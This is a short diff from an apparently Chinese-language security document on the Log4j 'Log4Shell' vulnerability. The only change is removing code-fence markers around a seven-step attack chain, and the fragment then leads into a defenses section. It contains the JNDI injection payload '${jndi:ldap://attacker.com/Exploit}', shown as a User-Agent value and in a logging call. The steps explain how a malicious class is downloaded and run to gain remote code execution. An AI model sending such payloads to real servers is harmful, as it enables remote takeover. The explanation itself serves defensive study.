@@ -1708,7 +1708,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 
 #### 8.5.2 攻击链路
 
-```
 1. 攻击者发送 HTTP 请求，User-Agent: ${jndi:ldap://attacker.com/Exploit}
 2. 应用记录日志：logger.info("User-Agent: {}", userAgent)
 3. Log4j 2 解析 ${jndi:...}，调用 JndiLookup.lookup()
@@ -1716,7 +1715,6 @@ logger.info("User-Agent: ${jndi:ldap://attacker.com/Exploit}");
 5. attacker.com 返回一个 RMI 引用，指向恶意类的 Codebase
 6. 应用从 Codebase 下载并执行恶意类
 7. 攻击者获得 RCE 权限
-```
 
 #### 8.5.3 防御措施
 
